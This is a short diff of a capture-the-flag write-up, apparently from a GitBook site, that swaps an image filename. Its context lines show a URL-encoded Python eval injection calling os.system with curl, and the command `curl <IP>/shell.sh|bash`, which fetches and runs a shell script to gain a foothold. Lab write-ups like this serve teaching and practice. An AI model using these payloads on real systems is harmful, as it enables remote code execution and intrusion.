@@ -70,7 +70,7 @@ d'%2beval(compile('for+x+in+range(1)%3a\n+import+os\n+os.system("curl+http%3a//1
 
 All we have to do is change the command to `curl <IP>/shell.sh|bash`.
 
-<figure><img src="../../.gitbook/assets/image (47) (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (47) (4) (2).png" alt=""><figcaption></figcaption></figure>
 
 With this, we can grab the user flag.
 
